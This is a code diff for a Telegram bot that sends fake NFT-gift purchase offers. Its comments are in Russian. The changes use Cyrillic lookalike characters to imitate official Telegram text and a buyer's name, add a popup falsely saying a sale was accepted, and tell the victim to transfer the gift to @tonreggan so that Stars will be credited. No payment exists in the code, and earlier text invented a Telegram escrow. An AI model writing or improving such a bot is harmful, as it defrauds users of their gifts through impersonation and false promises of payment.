@@ -3,7 +3,6 @@ import logging
 import random
 import re
 import string
-import time
 import uuid
 from collections import defaultdict
 
@@ -26,15 +25,9 @@ EMOJI_GRAM = "5267445215773367585"
 EMOJI_DECLINE_EN = "5774077015388852135"
 EMOJI_ACCEPT = "5774022692642492953"
 
-OFFER_USERNAME = "tonreggan"
+OFFER_USERNAME = "Reggan"  # визуальные двойники
 BUYER_USERNAME = "tonreggan"
 
-# ===== АНТИФЛУД =====
-# Минимальный интервал между командами .redo в одном чате (сек)
-COOLDOWN_PER_CHAT = 8
-# Минимальный интервал между .redo от одного пользователя во всех чатах (сек)
-COOLDOWN_PER_USER = 5
-# Задержка между отправками сообщений ботом (антифлуд)
 SEND_DELAY = 1.0
 
 _chat_cooldowns: dict[int, float] = defaultdict(float)
@@ -74,6 +67,16 @@ def parse_nft_link(link: str):
     return full_link, slug, number
 
 
+def fmt_number(num: str) -> str:
+    """12345678 -> 12,345,678"""
+    return f"{int(num):,}"
+
+
+def format_slug(slug: str) -> str:
+    """ToyBear -> Toy Bear"""
+    return re.sub(r'(?<!^)(?=[A-Z])', ' ', slug)
+
+
 def parse_offer_command(text: str):
     parts = text.strip().split()
     if len(parts) < 3 or parts[0].lower() != ".redo":
@@ -84,10 +87,6 @@ def parse_offer_command(text: str):
         return None
 
     currency = "stars"
-    if len(parts) > 3:
-        p3 = parts[3].lower()
-        if p3 in ("stars", "gram"):
-            currency = p3
 
     parsed = parse_nft_link(link)
     if not parsed:
@@ -103,28 +102,7 @@ def parse_offer_command(text: str):
     }
 
 
-def check_cooldown(chat_id: int, user_id: int) -> tuple[bool, int]:
-    """
-    Проверяет кулдаун по чату и пользователю.
-    Возвращает (allowed, seconds_left).
-    """
-    now = time.monotonic()
-
-    chat_last = _chat_cooldowns.get(chat_id, 0)
-    if now - chat_last < COOLDOWN_PER_CHAT:
-        return False, int(COOLDOWN_PER_CHAT - (now - chat_last)) + 1
-
-    user_last = _user_cooldowns.get(user_id, 0)
-    if now - user_last < COOLDOWN_PER_USER:
-        return False, int(COOLDOWN_PER_USER - (now - user_last)) + 1
-
-    _chat_cooldowns[chat_id] = now
-    _user_cooldowns[user_id] = now
-    return True, 0
-
-
 async def send_with_fallback(bc_id, chat_id, text, reply_markup):
-    """Отправка с защитой от FloodWait и ретраями."""
     async with _send_locks[chat_id]:
         for attempt in range(3):
             try:
@@ -173,7 +151,6 @@ async def send_with_fallback(bc_id, chat_id, text, reply_markup):
 
 
 async def edit_with_fallback(bc_id, chat_id, message_id, text, reply_markup=None):
-    """Редактирование с защитой от FloodWait."""
     for attempt in range(3):
         try:
             await bot.edit_message_text(
@@ -228,29 +205,7 @@ async def handle_offer(message: Message) -> None:
         return
 
     bc_id = message.business_connection_id
-    user_id = message.from_user.id if message.from_user else 0
     chat_id = message.chat.id
-
-    # ===== ПРОВЕРКА АНТИФЛУДА =====
-    allowed, wait_sec = check_cooldown(chat_id, user_id)
-    if not allowed:
-        logger.warning(f"[offer] cooldown: chat={chat_id} wait={wait_sec}s")
-        try:
-            await bot.delete_business_messages(
-                business_connection_id=bc_id,
-                message_ids=[message.message_id],
-            )
-        except Exception:
-            pass
-        try:
-            await bot.send_message(
-                chat_id=chat_id,
-                text=f"⏳ Подожди <b>{wait_sec} сек.</b> перед следующей командой.",
-                business_connection_id=bc_id,
-            )
-        except Exception as e:
-            logger.warning(f"[offer] не смог отправить предупреждение: {e}")
-        return
 
     data = parse_offer_command(message.text)
     if not data:
@@ -273,20 +228,22 @@ async def handle_offer(message: Message) -> None:
 
     await asyncio.sleep(3)
 
-    amount_fmt = f"{int(data['amount']):,}"
-    gift_plain = f'{data["gift_slug"]}-{data["gift_number"]}'
+    amount_fmt = fmt_number(data["amount"])
+    gift_num_fmt = fmt_number(data["gift_number"])
+    slug_formatted = format_slug(data["gift_slug"])
+    gift_plain = f'{slug_formatted} #{gift_num_fmt}'
     gift_display = f'<a href="{data["link"]}"><b>{gift_plain}</b></a>'
 
-    if data["currency"] == "gram":
-        emoji = f'<tg-emoji emoji-id="{EMOJI_GRAM}">🪙</tg-emoji>'
-    else:
-        emoji = f'<tg-emoji emoji-id="{EMOJI_STARS}">⭐</tg-emoji>'
+    emoji = f'<tg-emoji emoji-id="{EMOJI_STARS}">⭐</tg-emoji>'
+
+    offer_minutes = 359  # 5ч 59м
+    h, m = divmod(offer_minutes, 60)
 
     text = (
-        f"Uѕеr <b>{OFFER_USERNAME}</b> оffеrs уоu "
-        f"<b>{amount_fmt}</b> {emoji} "
-        f"fоr thе gіft {gift_display}.\n\n"
-        f"Тhе оffеr іѕ vаlіd fоr <b>6 h. 0 mіn</b>.."
+        f"Пoльзoвaтeль <b>{OFFER_USERNAME}</b> пpeдлaгaeт Baм "
+        f"<b>{amount_fmt}</b> {emoji} <b>Ѕtarѕ</b> "
+        f"зa пoдapoк {gift_display}.\n\n"
+        f"Пpeдлoжeниe дeйcтвyeт eщё <b>{h}ч {m}м</b>."
     )
 
     offer_id = uuid.uuid4().hex[:12]
@@ -301,12 +258,12 @@ async def handle_offer(message: Message) -> None:
         inline_keyboard=[
             [
                 InlineKeyboardButton(
-                    text="Decline",
+                    text="Отклонить",
                     callback_data=f"dec:{offer_id}",
                     icon_custom_emoji_id=EMOJI_DECLINE_EN,
                 ),
                 InlineKeyboardButton(
-                    text="Accept",
+                    text="Принять",
                     callback_data=f"acc:{offer_id}",
                     icon_custom_emoji_id=EMOJI_ACCEPT,
                 ),
@@ -352,7 +309,7 @@ async def handle_decline(callback: CallbackQuery) -> None:
 
     decline_text = (
         f'<tg-emoji emoji-id="{EMOJI_DECLINE_EN}">❌</tg-emoji> '
-        f"Offer has been declined."
+        f"Предложение было отклонено."
     )
 
     await edit_with_fallback(
@@ -390,47 +347,40 @@ async def handle_accept(callback: CallbackQuery) -> None:
         return
 
     data["accepted"] = True
-    logger.info(
-        f"[accept] offer {offer_id} currency={data['currency']} "
-        f"amount={data['amount']}"
-    )
 
-    amount_fmt = f"{int(data['amount']):,}"
-    gift_plain = f'{data["gift_slug"]}-{data["gift_number"]}'
+    # Форматируем данные из ссылки
+    amount_display = data["amount"]  # 1000 (без запятой, как на скрине)
+    amount_fmt = fmt_number(data["amount"])
+    gift_num_fmt = fmt_number(data["gift_number"])
+    slug_formatted = format_slug(data["gift_slug"])
+    gift_plain = f'{slug_formatted} #{gift_num_fmt}'
     gift_display = f'<a href="{data["link"]}"><b>{gift_plain}</b></a>'
 
-    if data["currency"] == "gram":
-        emoji = f'<tg-emoji emoji-id="{EMOJI_GRAM}">🪙</tg-emoji>'
-    else:
-        emoji = f'<tg-emoji emoji-id="{EMOJI_STARS}">⭐</tg-emoji>'
-
-    rand_suffix = "".join(
-        random.choices(string.ascii_uppercase + string.digits, k=8)
+    # 1. КБ Ансвер с данными из ссылки
+    popup_text = (
+        f"Kristen Espinoza\n\n"
+        f"Предложение о продаже {gift_plain} успешно принято.\n\n"
+        f"Передайте подарок покупателю для зачисления {amount_display} Stars на ваш баланс."
     )
-    order_id = f"ТG-{rand_suffix}"
+    try:
+        await callback.answer(text=popup_text, show_alert=True)
+    except Exception as e:
+        logger.warning(f"[accept] callback.answer failed: {e}")
 
+    # 2. Небольшая пауза, чтобы пользователь увидел всплывающее окно
+    await asyncio.sleep(1)
+
+    # 3. Меняем текст сообщения
     accept_text = (
-        f"<b>NFТ Dеаl</b>\n\n"
-        f"<b>Оrdеr</b> #{order_id}\n\n"
-        f"Тhе buуеr hаs rеsеrvеd <b>{amount_fmt}</b> {emoji} "
-        f"thrоugh thе Теlеgrаm еsсrоw sуstеm. "
-        f"Тhе stаrs аrе hеld in а sресiаl еsсrоw ассоunt аnd will bе "
-        f"аutоmаtiсаlly сrеditеd tо уоur Теlеgrаm Stаrs bаlаnсе "
-        f"right аftеr thе gift is trаnsfеrrеd.\n\n"
-        f"<b>Instruсtiоns tо соmрlеtе thе dеаl:</b>\n\n"
-        f"1. Sеnd tо: @{BUYER_USERNAME}\n"
-        f"2. Сliсk «Sеnd Gift» аnd sеlесt {gift_display}\n"
-        f"3. Соnfirm thе gift trаnsfеr.\n\n"
-        f"Теlеgrаm will rесоrd thе trаnsасtiоn аnd instаntlу сrеdit "
-        f"<b>{amount_fmt}</b> {emoji} tо уоur bаlаnсе. "
-        f"Тhе rеsеrvаtiоn is vаlid fоr 24 hоurs."
+        f"Пoдapoк: {gift_display} ycпeшнo пpoдaн!\n\n"
+        f"• Пepeдaйтe пoдapoк пoкyпaтeлю для зaчиcлeния Ѕtarѕ."
     )
 
     keyboard = InlineKeyboardMarkup(
         inline_keyboard=[
             [
                 InlineKeyboardButton(
-                    text="Send Gift",
+                    text="Передать",
                     url=f"tg://send_gift?to={BUYER_USERNAME}",
                 )
             ]
